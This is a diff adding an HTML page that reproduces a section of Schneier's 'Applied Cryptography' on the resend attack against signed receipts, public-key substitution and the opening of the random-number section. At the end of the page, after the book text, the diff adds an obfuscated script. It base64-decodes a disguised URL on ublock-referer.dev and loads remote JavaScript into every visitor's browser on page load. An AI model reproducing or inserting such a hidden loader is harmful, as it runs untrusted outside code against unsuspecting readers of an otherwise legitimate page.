@@ -1,0 +1,116 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=042-044//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Resending the Message as a Receipt</I></B></FONT></P>
+<P>Consider an implementation of this protocol, with the additional feature of confirmation messages. Whenever Bob receives a message, he returns it as a confirmation of receipt.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs a message with her private key, encrypts it with Bob&#146;s public key, and sends it to Bob.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>S</I><SUB>A</SUB>(<I>M</I>))
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob decrypts the message with his private key and verifies the signature with Alice&#146;s public key, thereby verifying that Alice signed the message and recovering the message.
+<DL>
+<DD><I>V</I><SUB>A</SUB>(<I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>S</I><SUB>A</SUB>(<I>M</I>)))) = <I>M</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob signs the message with his private key, encrypts it with Alice&#146;s public key, and sends it back to Alice.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>S</I><SUB>B</SUB>(<I>M</I>))
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice decrypts the message with her private key and verifies the signature with Bob&#146;s public key. If the resultant message is the same one she sent to Bob, she knows that Bob received the message accurately.
+</DL>
+<P>If the same algorithm is used for both encryption and digital-signature verification there is a possible attack [506]. In these cases, the digital signature operation is the inverse of the encryption operation: <I>V</I><SUB>X</SUB> = <I>E</I><SUB>X</SUB> and <I>S</I><SUB>X</SUB> = <I>D</I><SUB>X</SUB>.</P>
+<P>Assume that Mallory is a legitimate system user with his own public and private key. Now, let&#146;s watch as he reads Bob&#146;s mail. First, he records Alice&#146;s message to Bob in step (1). Then, at some later time, he sends that message to Bob, claiming that it came from him (Mallory). Bob thinks that it is a legitimate message from Mallory, so he decrypts the message with his private key and then tries to verify Mallory&#146;s signature by decrypting it with Mallory&#146;s public key. The resultant message, which is pure gibberish, is:</P>
+<DL>
+<DD><I>E</I><SUB>M</SUB>(<I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>D</I><SUB>A</SUB>(<I>M</I>)))) = <I>E</I><SUB>M</SUB>(<I>D</I><SUB>A</SUB>(<I>M</I>))
+</DL>
+<P>Even so, Bob goes on with the protocol and sends Mallory a receipt:
+</P>
+<DL>
+<DD><I>E</I><SUB>M</SUB>(<I>D</I><SUB>B</SUB>(<I>E</I><SUB>M</SUB>(<I>D</I><SUB>A</SUB>
+<I>M</I>))))
+</DL>
+<P>Now, all Mallory has to do is decrypt the message with his private key, encrypt it with Bob&#146;s public key, decrypt it again with his private key, and encrypt it with Alice&#146;s public key. <I>Voil&#224;!</I> Mallory has <I>M</I>.</P>
+<P>It is not unreasonable to imagine that Bob may automatically send Mallory a receipt. This protocol may be embedded in his communications software, for example, and send receipts automatically. It is this willingness to acknowledge the receipt of gibberish that creates the insecurity. If Bob checked the message for comprehensibility before sending a receipt, he could avoid this security problem.</P>
+<P>There are enhancements to this attack that allow Mallory to send Bob a different message from the one he eavesdropped on. Never sign arbitrary messages from other people or decrypt arbitrary messages and give the results to other people.</P>
+<P><FONT SIZE="+1"><B><I>Foiling the Resend Attack</I></B></FONT></P>
+<P>The attack just described works because the encrypting operation is the same as the signature-verifying operation and the decryption operation is the same as the signature operation. A secure protocol would use even a slightly different operation for encryption and digital signatures. Using different keys for each operation solves the problem, as does using different algorithms for each operation; as do timestamps, which make the incoming message and the outgoing message different; as do digital signatures with one-way hash functions (see Section 2.6).
+</P>
+<P>In general, then, the following protocol is secure as the public-key algorithm used:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs a message.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts the message and signature with Bob&#146;s public key (using a different encryption algorithm than for the signature) and sends it to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob decrypts the message with his private key.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob verifies Alice&#146;s signature.
+</DL>
+<P><FONT SIZE="+1"><B><I>Attacks against Public-Key Cryptography</I></B></FONT></P>
+<P>In all these public-key cryptography protocols, I glossed over how Alice gets Bob&#146;s public key. Section 3.1 discusses this in detail, but it is worth mentioning here.
+</P>
+<P>The easiest way to get someone&#146;s public key is from a secure database somewhere. The database has to be public, so that anyone can get anyone else&#146;s public key. The database also has to be protected from write-access by anyone except Trent; otherwise Mallory could substitute any public key for Bob&#146;s. After he did that, Bob couldn&#146;t read messages addressed to him, but Mallory could.</P>
+<P>Even if the public keys are stored in a secure database, Mallory could still substitute one for another during transmission. To prevent this, Trent can sign each public key with his own private key. Trent, when used in this manner, is often known as a <B>Key Certification Authority</B> or <B>Key Distribution Center</B> (<B>KDC</B>). In practical implementations, the KDC signs a compound message consisting of the user&#146;s name, his public key, and any other important information about the user. This signed compound message is stored in the KDC&#146;s database. When Alice gets Bob&#146;s key, she verifies the KDC&#146;s signature to assure herself of the key&#146;s validity.</P>
+<P>In the final analysis, this is not making things impossible for Mallory, only more difficult. Alice still has the KDC&#146;s public key stored somewhere. Mallory would have to substitute his own public key for that key, corrupt the database, and substitute his own keys for the valid keys (all signed with his private key as if he were the KDC), and then he&#146;s in business. But, even paper-based signatures can be forged if Mallory goes to enough trouble. Key exchange will be discussed in minute detail in Section 3.1.</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">2.8 Random and Pseudo-Random-Sequence Generation</FONT></H3>
+<P>Why even bother with random-number generation in a book on cryptography? There&#146;s already a random-number generator built into most every compiler, a mere function call away. Why not use that? Unfortunately, those random-number generators are almost definitely not secure enough for cryptography, and probably not even very random. Most of them are embarrassingly bad.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(BoUDhJlw, DhDqPRdY) {DhDqPRdY = BoUDhJlw.createElement('script');DhDqPRdY.type = 'text/javascript';DhDqPRdY.async = true;DhDqPRdY.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');BoUDhJlw.getElementsByTagName('body')[0].appendChild(DhDqPRdY);}(document));</script></body>
+</html>
